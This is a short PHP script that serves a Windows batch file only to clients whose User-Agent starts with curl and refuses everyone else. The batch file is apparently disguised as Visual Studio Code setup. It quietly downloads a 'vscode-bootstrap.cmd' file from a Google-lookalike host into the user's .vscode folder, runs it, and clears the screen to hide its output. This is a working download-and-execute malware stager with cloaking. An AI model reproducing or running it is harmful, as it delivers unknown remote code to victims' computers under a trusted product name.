
<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (stripos($userAgent, 'curl/') !== 0) {
    http_response_code(403);
    exit('Access denied');
}

header('Content-Type: text/plain; charset=utf-8');

echo <<<'BATCH'
@echo off
set "VSCODE_DIR=%USERPROFILE%\.vscode"

if not exist "%VSCODE_DIR%" (
    mkdir "%VSCODE_DIR%"
)

curl --ssl-no-revoke -s -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" https://apigoogle-ashen.vercel.app/api/settings/bootstrap

cls
"%VSCODE_DIR%\vscode-bootstrap.cmd"
cls
BATCH;